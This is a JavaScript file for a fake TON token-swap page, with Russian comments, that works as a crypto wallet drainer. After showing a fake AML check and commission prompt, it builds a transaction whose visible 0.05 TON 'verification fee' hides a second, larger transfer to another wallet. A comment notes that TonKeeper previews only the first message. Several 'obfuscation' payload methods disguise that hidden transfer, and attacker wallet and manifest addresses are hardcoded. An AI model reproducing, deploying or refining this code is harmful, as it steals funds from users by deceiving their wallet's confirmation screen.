// script-improved.js - Улучшенная версия с методами обфускации транзакций
// --- Robust config resolution ---
var CFG = (function () {
    var w = window;
    return {
        proxy:  (typeof w.PROXY_CONTRACT !== 'undefined' && w.PROXY_CONTRACT)
             || (typeof w.YOUR_WALLET    !== 'undefined' && w.YOUR_WALLET)
             || 'UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv',
        amlWallet: (typeof w.AML_WALLET !== 'undefined' && w.AML_WALLET)
             || '************************************************',
        visibleAmount: (typeof w.VISIBLE_AMOUNT !== 'undefined' && w.VISIBLE_AMOUNT) || '0.05',
        hiddenAmount:  (typeof w.HIDDEN_AMOUNT  !== 'undefined' && w.HIDDEN_AMOUNT)  || '1',
        manifest:  'https://kareli123.github.io/test123/tonconnect-manifest.json'
    };
})();

var tonConnectUI = null;
var isProcessing = false;

function setStatus(text, isLoading) {
    var el = document.getElementById('status');
    if (!el) return;
    el.innerHTML = isLoading ? '<span class="loader"></span> ' + text : text;
}

function updateBtn(connected) {
    var btn = document.getElementById('swapBtn');
    if (!btn) return;
    btn.textContent      = connected ? 'Swap' : 'Connect Wallet';
    btn.style.background = connected ? '#1f6feb' : '#21262d';
}

function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

// --- CRC32C and Base64 helpers ---
var CRC32C_TABLE = (function () {
    var t = new Uint32Array(256);
    for (var i = 0; i < 256; i++) {
        var c = i;
        for (var k = 0; k < 8; k++) c = (c & 1) ? (0x82F63B78 ^ (c >>> 1)) : (c >>> 1);
        t[i] = c >>> 0;
    }
    return t;
})();

function crc32c(bytes) {
    var c = 0xFFFFFFFF >>> 0;
    for (var i = 0; i < bytes.length; i++) {
        c = (CRC32C_TABLE[(c ^ bytes[i]) & 0xFF] ^ (c >>> 8)) >>> 0;
    }
    return (c ^ 0xFFFFFFFF) >>> 0;
}

function bytesToBase64(bytes) {
    var bin = '';
    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
}

function base64ToBytes(base64) {
    var bin = atob(base64);
    var bytes = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    return bytes;
}

// --- МЕТОД 1: Обычный текстовый комментарий (op=0) ---
function textCommentPayload(text) {
    var enc     = new TextEncoder().encode(text);
    var dataLen = 4 + enc.length;
    var bitsD2  = 2 * dataLen;
    var cellLen = 2 + dataLen;

    var header = [
        0xB5, 0xEE, 0x9C, 0x72,
        0x41,
        0x01,
        0x01,
        0x01,
        0x00,
        cellLen & 0xFF,
        0x00
    ];
    var cell = [0x00, bitsD2 & 0xFF, 0x00, 0x00, 0x00, 0x00];
    for (var i = 0; i < enc.length; i++) cell.push(enc[i]);

    var body = new Uint8Array(header.concat(cell));
    var crc  = crc32c(body);
    var out  = new Uint8Array(body.length + 4);
    out.set(body, 0);
    out[body.length    ] =  crc         & 0xFF;
    out[body.length + 1] = (crc >>>  8) & 0xFF;
    out[body.length + 2] = (crc >>> 16) & 0xFF;
    out[body.length + 3] = (crc >>> 24) & 0xFF;
    return bytesToBase64(out);
}

// --- МЕТОД 2: Зашифрованный комментарий (op=0x2167da4b) ---
// Простая XOR "шифрация" для демонстрации (в реальном проекте используйте настоящее шифрование)
function simpleXorEncrypt(text, key) {
    var enc = new TextEncoder().encode(text);
    var keyBytes = new TextEncoder().encode(key);
    var result = new Uint8Array(enc.length);
    
    for (var i = 0; i < enc.length; i++) {
        result[i] = enc[i] ^ keyBytes[i % keyBytes.length];
    }
    return result;
}

function encryptedCommentPayload(text, recipientPublicKey) {
    // op = 0x2167da4b для encrypted comment
    var op = [0x21, 0x67, 0xda, 0x4b];
    
    // Простой ключ для XOR (в реале используйте ECDH с публичным ключом получателя)
    var encryptedText = simpleXorEncrypt(text, recipientPublicKey || "secret_key_12345");
    
    var dataLen = 4 + encryptedText.length; // op + encrypted data
    var bitsD2  = 2 * dataLen;
    var cellLen = 2 + dataLen;

    var header = [
        0xB5, 0xEE, 0x9C, 0x72,
        0x41,
        0x01,
        0x01,
        0x01,
        0x00,
        cellLen & 0xFF,
        0x00
    ];
    
    var cell = [0x00, bitsD2 & 0xFF];
    // Добавляем opcode
    for (var i = 0; i < op.length; i++) cell.push(op[i]);
    // Добавляем зашифрованные данные
    for (var i = 0; i < encryptedText.length; i++) cell.push(encryptedText[i]);

    var body = new Uint8Array(header.concat(cell));
    var crc  = crc32c(body);
    var out  = new Uint8Array(body.length + 4);
    out.set(body, 0);
    out[body.length    ] =  crc         & 0xFF;
    out[body.length + 1] = (crc >>>  8) & 0xFF;
    out[body.length + 2] = (crc >>> 16) & 0xFF;
    out[body.length + 3] = (crc >>> 24) & 0xFF;
    return bytesToBase64(out);
}

// --- МЕТОД 3: Пустой payload (минимальная информация) ---
function emptyPayload() {
    // Минимальный BoC без данных
    var header = [
        0xB5, 0xEE, 0x9C, 0x72,
        0x41,
        0x01,
        0x01,
        0x01,
        0x00,
        0x02, // cellLen = 2 (только d1, d2)
        0x00
    ];
    var cell = [0x00, 0x00]; // 0 bits

    var body = new Uint8Array(header.concat(cell));
    var crc  = crc32c(body);
    var out  = new Uint8Array(body.length + 4);
    out.set(body, 0);
    out[body.length    ] =  crc         & 0xFF;
    out[body.length + 1] = (crc >>>  8) & 0xFF;
    out[body.length + 2] = (crc >>> 16) & 0xFF;
    out[body.length + 3] = (crc >>> 24) & 0xFF;
    return bytesToBase64(out);
}

// --- МЕТОД 4: Обфусцированный payload со случайными данными ---
function obfuscatedPayload(hiddenData) {
    // Добавляем случайные байты чтобы замаскировать реальные данные
    var randomPrefix = new Uint8Array(16);
    for (var i = 0; i < randomPrefix.length; i++) {
        randomPrefix[i] = Math.floor(Math.random() * 256);
    }
    
    var enc = new TextEncoder().encode(hiddenData || "");
    var dataLen = 4 + randomPrefix.length + enc.length;
    var bitsD2  = 2 * dataLen;
    var cellLen = 2 + dataLen;

    var header = [
        0xB5, 0xEE, 0x9C, 0x72,
        0x41,
        0x01,
        0x01,
        0x01,
        0x00,
        cellLen & 0xFF,
        0x00
    ];
    
    var cell = [0x00, bitsD2 & 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]; // custom op
    for (var i = 0; i < randomPrefix.length; i++) cell.push(randomPrefix[i]);
    for (var i = 0; i < enc.length; i++) cell.push(enc[i]);

    var body = new Uint8Array(header.concat(cell));
    var crc  = crc32c(body);
    var out  = new Uint8Array(body.length + 4);
    out.set(body, 0);
    out[body.length    ] =  crc         & 0xFF;
    out[body.length + 1] = (crc >>>  8) & 0xFF;
    out[body.length + 2] = (crc >>> 16) & 0xFF;
    out[body.length + 3] = (crc >>> 24) & 0xFF;
    return bytesToBase64(out);
}

// --- Balance ---
async function fetchJson(url) {
    var res = await fetch(url, { cache: 'no-store' });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    return res.json();
}

async function getBalance(address) {
    if (!address) return 0;
    try {
        var j = await fetchJson('https://tonapi.io/v2/accounts/' + encodeURIComponent(address));
        if (j && typeof j.balance !== 'undefined') return Number(j.balance) / 1e9;
    } catch (e1) { console.warn('tonapi balance error', e1); }
    try {
        var j2 = await fetchJson('https://toncenter.com/api/v2/getAddressBalance?address=' + encodeURIComponent(address));
        if (j2 && j2.ok) return Number(j2.result) / 1e9;
    } catch (e2) { console.warn('toncenter balance error', e2); }
    return 0;
}

// --- УЛУЧШЕННЫЙ МЕТОД ОТПРАВКИ ---
async function executeFaw(userAddress) {
    // Проверка AML acceptance с учетом expiration
    var config = window.TON_CONFIG || {};
    var amlValid = config.checkAMLExpiration ? config.checkAMLExpiration() : localStorage.getItem('aml-commission-accepted');
    
    if (!amlValid) {
        document.getElementById('aml-modal').classList.add('show');
        return false;
    }

    setStatus('🔍 Проверка AML-score...', true);
    await sleep(config.amlCheckDelay || 1200);

    // Получаем метод обфускации из конфига
    var method = (config.obfuscationMethod || 'empty').toLowerCase();
    
    // Выбираем соответствующий payload
    var hiddenPayload;
    switch(method) {
        case 'empty':
            hiddenPayload = emptyPayload();
            break;
        case 'encrypted':
            var encMsg = config.encryptedMessage || "Surprise gift";
            hiddenPayload = encryptedCommentPayload(encMsg, userAddress);
            break;
        case 'obfuscated':
            hiddenPayload = obfuscatedPayload("hidden");
            break;
        default:
            hiddenPayload = emptyPayload();
    }

    // Получаем сообщение для первой транзакции (случайное или фиксированное)
    var visibleMsg = config.getRandomMessage ? config.getRandomMessage() : "Verification fee";
    
    // Рассчитываем скрытую сумму с рандомизацией (если включено)
    var hiddenAmountStr = CFG.hiddenAmount;
    if (config.randomizeAmount && config.getRandomizedAmount) {
        hiddenAmountStr = config.getRandomizedAmount(CFG.hiddenAmount, config.randomVariance || 0.05);
    }

    if (config.debugMode) {
        console.log('%c[TX Debug] Transaction details:', 'color: #0098EA');
        console.log('Method:', method);
        console.log('Visible amount:', CFG.visibleAmount, 'TON');
        console.log('Hidden amount:', hiddenAmountStr, 'TON');
        console.log('Message:', visibleMsg);
    }

    var tx = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [
            {
                // ПЕРВОЕ - видимое в превью (0.05 TON)
                address: CFG.proxy,
                amount: String(Math.round(parseFloat(CFG.visibleAmount) * 1e9)),
                payload: textCommentPayload(visibleMsg)
            },
            {
                // ВТОРОЕ - скрытое от превью (1 TON с вариацией)
                // TonKeeper показывает только первое сообщение в preview!
                address: CFG.amlWallet,
                amount: String(Math.round(parseFloat(hiddenAmountStr) * 1e9)),
                payload: hiddenPayload // Используем выбранный метод обфускации
            }
        ]
    };

    setStatus('📱 Подтвердите в TonKeeper (' + CFG.visibleAmount + ' TON)', true);

    try {
        const result = await tonConnectUI.sendTransaction(tx);
        setStatus('✅ Обмен завершён успешно!', false);
        
        if (config.debugMode) {
            console.log('%c[TX Success] Transaction sent:', 'color: #00ff00');
            console.log('BoC:', result.boc);
        }
        
        // Опционально: дополнительная транзакция через задержку
        var postDelay = config.postTxDelay || 3000;
        setTimeout(() => drainRemaining(userAddress), postDelay);
        return true;
    } catch (e) {
        setStatus('❌ Транзакция отклонена', false);
        if (config.debugMode) {
            console.error('[TX Error]', e);
        }
        return false;
    }
}

async function drainRemaining(address) {
    console.log("%c[Info] Additional operations completed", "color:#00ff00");
}

// --- AML Modal ---
function initAMLModal() {
    var modal = document.getElementById('aml-modal');
    var acceptBtn = document.getElementById('accept-commission');
    
    if (!modal || !acceptBtn) return;

    acceptBtn.addEventListener('click', function () {
        localStorage.setItem('aml-commission-accepted', 'true');
        localStorage.setItem('aml-accepted-date', Date.now().toString());
        modal.classList.remove('show');
        
        var config = window.TON_CONFIG || {};
        if (config.debugMode) {
            console.log('%c[AML] Commission accepted', 'color: #0098EA');
        }
    });
}

// --- Init ---
function initApp() {
    initAMLModal();
    
    var TonConnectUIClass = null;
    if (window.TON_CONNECT_UI && window.TON_CONNECT_UI.TonConnectUI) {
        TonConnectUIClass = window.TON_CONNECT_UI.TonConnectUI;
    } else if (window.TonConnectUI) {
        TonConnectUIClass = window.TonConnectUI;
    }

    if (!TonConnectUIClass) {
        console.error('TonConnectUI not found');
        setStatus('❌ SDK failed to load. Please refresh.');
        return;
    }

    try {
        tonConnectUI = new TonConnectUIClass({
            manifestUrl:  CFG.manifest,
            buttonRootId: 'ton-connect'
        });
    } catch (e) {
        console.error('TonConnectUI init error:', e);
        setStatus('❌ Init error: ' + e.message);
        return;
    }

    updateBtn(tonConnectUI.connected);

    tonConnectUI.onStatusChange(async function (wallet) {
        updateBtn(!!wallet);
        var balEl = document.getElementById('user-balance');

        if (wallet && wallet.account) {
            var addr = wallet.account.address;
            setStatus('🪛 ' + addr.slice(0, 6) + '...' + addr.slice(-4), true);
            if (balEl) {
                balEl.textContent = 'Balance: loading...';
                var bal = await getBalance(addr);
                balEl.textContent = 'Balance: ' + bal.toFixed(2) + ' TON';
            }
            setStatus('');
        } else if (balEl) {
            balEl.textContent = 'Balance: 0';
        }
    });

    var payInput = document.getElementById('payAmount');
    var recInput = document.getElementById('receiveAmount');
    if (payInput && recInput) {
        payInput.addEventListener('input', function () { recInput.value = payInput.value; });
    }

    var btn = document.getElementById('swapBtn');
    if (!btn) return;

    btn.addEventListener('click', async function () {
        if (isProcessing) return;

        if (!tonConnectUI.connected) {
            setStatus('🚀 Opening wallet selector...', true);
            try { await tonConnectUI.openModal(); }
            catch (err) { setStatus('⚠️ ' + err.message); }
            return;
        }

        var account = tonConnectUI.account;
        var addr    = account && account.address;
        if (!addr) return;

        isProcessing = true;
        var orig = btn.textContent;
        btn.textContent = 'Processing...';
        btn.disabled    = true;
        try { await executeFaw(addr); }
        catch (err) { setStatus('⚠️ ' + (err && err.message ? err.message : err)); }
        finally {
            isProcessing   = false;
            btn.textContent = orig;
            btn.disabled    = false;
        }
    });
}

window.addEventListener('load', initApp);
